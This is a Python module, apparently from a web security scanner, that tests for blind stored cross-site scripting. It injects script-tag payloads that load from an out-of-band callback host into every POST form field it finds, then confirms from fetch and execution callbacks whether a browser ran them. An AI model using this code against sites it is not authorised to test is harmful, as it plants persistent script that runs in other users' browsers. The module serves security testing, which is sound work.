"""SV1 - blind xss.

The sink is not on any page the scanner can read. Seed every POST form with a
script that points at our callback, then wait. A hit proves the payload was
rendered somewhere; the follow-up image proves a browser executed it.
"""

from __future__ import annotations

import time
import urllib.parse
from dataclasses import dataclass

from . import config, net
from .models import Finding, Page
from .oob import Callback

TEXT_TYPES = ("text", "search", "url", "email", "tel", "textarea", "select", "")
SKIP_TYPES = ("submit", "button", "image", "reset", "file")


@dataclass
class Probe:
    token: str
    page: str
    action: str
    field: str
    payload: str


def _usable(field, include_hidden: bool = False,
            include_password: bool = False) -> bool:
    kind = (field.type or "").lower()
    if kind == "hidden":
        return include_hidden
    if kind == "password":
        return include_password
    return kind in TEXT_TYPES


def _forms(pages: list[Page], include_hidden: bool = False,
           include_password: bool = False):
    for page in pages:
        for form in page.forms:
            if (form.method or "").lower() != "post":
                continue
            targets = [
                field for field in form.fields
                if _usable(field, include_hidden, include_password)
            ]
            if targets:
                yield page, form, targets[: config.BLIND_TEST_FIELDS]


def _shapes() -> list[str]:
    shapes = (
        '<script src="{url}"></script>',
        '"><script src="{url}"></script>',
    )
    return list(shapes[: config.BLIND_VARIANTS])


def _submit(client, page_url: str, form, field_name: str, payload: str):
    action = urllib.parse.urljoin(page_url, form.action or page_url).split("#", 1)[0]
    if not net.same_origin(action, page_url):
        return None
    data: dict[str, str] = {}
    files: dict[str, tuple] = {}
    for item in form.fields:
        kind = (item.type or "").lower()
        if kind in SKIP_TYPES or not item.name:
            continue
        value = payload if item.name == field_name else (item.value or "")
        if form.enctype == "multipart/form-data":
            files[item.name] = (None, str(value))
        else:
            data[item.name] = str(value)
    if files:
        return client.request("POST", action, files=files, allow_redirects=False)
    return client.request("POST", action, data=data, allow_redirects=False)


def _sink(exec_hit, script_hit, visits: list[str], page_url: str) -> tuple[str, str]:
    def safe(value: str) -> str:
        text = "".join(ch for ch in str(value) if ch >= " ")
        return text[:500]

    if exec_hit is not None:
        query = urllib.parse.parse_qs(exec_hit.query, keep_blank_values=True)
        value = safe((query.get("p") or [""])[0])
        if value.startswith(("http://", "https://")):
            return value, "GET"
        referer = safe(exec_hit.referer)
        if referer.startswith(("http://", "https://")):
            return referer, "GET"
    if script_hit is not None:
        referer = safe(script_hit.referer)
        if referer.startswith(("http://", "https://")):
            return referer, "GET"
    if visits:
        return visits[0], "GET"
    return page_url, "POST"


def run(
    client,
    engine,
    pages: list[Page],
    callback: Callback,
    visits: list[str],
    wait: float,
    artifacts: str = "",
    include_hidden: bool = False,
    include_password: bool = False,
) -> tuple[list[Finding], str]:
    forms = list(
        _forms(pages, include_hidden, include_password)
    )[: config.BLIND_MAX_FORMS]
    if not forms:
        return [], "no post forms to seed"

    probes: list[Probe] = []
    for page, form, fields in forms:
        action = urllib.parse.urljoin(page.url, form.action or page.url).split("#", 1)[0]
        for field in fields:
            for shape in _shapes():
                token = callback.register(f"blind {action} [{field.name}]", "blind")
                payload = shape.replace("{url}", callback.url_for(token))
                response = _submit(client, page.url, form, field.name, payload)
                if response is not None and response.ok:
                    probes.append(Probe(token=token, page=page.url, action=action,
                                        field=field.name, payload=payload))
    if not probes:
        return [], "no form accepted the payload"

    visit_urls = [url for url in visits if url.startswith(("http://", "https://"))]
    visit_urls = visit_urls[: config.BLIND_MAX_VISITS]
    shots: dict[str, str] = {}
    visited = False
    if visit_urls and engine is not None and getattr(engine, "enabled", False):
        for index, url in enumerate(visit_urls, 1):
            shot = f"{artifacts}/blind-{index:02d}.png" if artifacts else ""
            visit = engine.visit(url, wait_ms=config.BLIND_VISIT_WAIT_MS, shot_path=shot)
            visited = True
            if visit.screenshot:
                shots[url] = visit.screenshot

    timeout = min(wait, config.BLIND_VISIT_WAIT) if visited else wait
    callback.settle([probe.token for probe in probes], timeout, need_exec=True)

    best: dict[tuple[str, str], dict] = {}
    for probe in probes:
        hits = callback.hits_for(probe.token)
        if not hits:
            continue
        exec_hit = next((hit for hit in hits if hit.kind == "exec"), None)
        script_hit = next((hit for hit in hits if hit.kind == "script"), None)
        if exec_hit is None and script_hit is None:
            continue
        rank = 2 if exec_hit is not None else 1
        key = (probe.action, probe.field)
        if key in best and best[key]["rank"] >= rank:
            continue
        best[key] = {
            "rank": rank,
            "probe": probe,
            "exec": exec_hit,
            "script": script_hit,
        }

    findings: list[Finding] = []
    for record in best.values():
        probe = record["probe"]
        exec_hit = record["exec"]
        script_hit = record["script"]
        proof = exec_hit or script_hit
        sink, method = _sink(exec_hit, script_hit, visit_urls if visited else [], probe.page)
        when = time.strftime("%H:%M:%S", time.localtime(proof.at))
        agent = proof.user_agent or "unknown agent"
        artifact = shots.get(sink, "") or (
            shots.get(visit_urls[0], "") if visits and visited else ""
        )

        if exec_hit is not None:
            fetched = time.strftime("%H:%M:%S", time.localtime(script_hit.at)) \
                if script_hit is not None else "?"
            executed = time.strftime("%H:%M:%S", time.localtime(exec_hit.at))
            severity = "HIGH"
            confidence = "CONFIRMED"
            evidence = (f"callback executed on {sink}: /t fetched at {fetched}, "
                        f"/e image at {executed} from {proof.remote} ({agent})")
            data = {
                "oob": "executed",
                "from": proof.remote,
                "agent": agent[:80],
                "fetched": fetched,
                "time": executed,
            }
        else:
            severity = "MEDIUM"
            confidence = "MEDIUM"
            evidence = (f"callback script fetched at {when} from {proof.remote} "
                        f"({agent}); /e not received, execution not proven; "
                        f"severity capped at MEDIUM")
            data = {
                "oob": "fetched",
                "from": proof.remote,
                "agent": agent[:80],
                "time": when,
            }

        findings.append(Finding(
            kind="XSS",
            severity=severity,
            url=sink,
            method=method,
            param=probe.field,
            payload=probe.payload,
            confidence=confidence,
            evidence=evidence,
            technique="blind-oob",
            detail=("blind xss: payload stored through POST "
                    f"{probe.action}; the callback fired when the page rendered it"),
            artifact=artifact,
            data=data,
        ))

    note = f"{len(probes)} payload(s) stored, {len(findings)} callback hit(s)"
    if visit_urls and not visited:
        note += ", visit skipped (no browser)"
    return findings, note
